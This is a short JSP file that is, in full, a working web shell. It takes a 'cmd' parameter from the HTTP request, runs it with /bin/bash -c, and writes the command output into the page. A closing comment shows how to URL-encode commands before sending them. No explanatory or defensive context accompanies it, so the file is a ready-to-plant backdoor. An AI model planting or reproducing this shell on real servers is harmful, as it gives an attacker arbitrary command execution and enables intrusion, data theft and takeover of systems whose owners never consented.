<%@ page import="java.io.*" %>
<%
   String thecmd = request.getParameter("cmd");
   String[] cmd = {"/bin/bash","-c",thecmd};
   String output = "";
   if(cmd[2] != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += "<br>" + s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
<pre>
<%=output %>
</pre>
// encode cmd parameter with python3 -c "import urllib.parse;print(urllib.parse.quote_plus(input(\":> \")))"
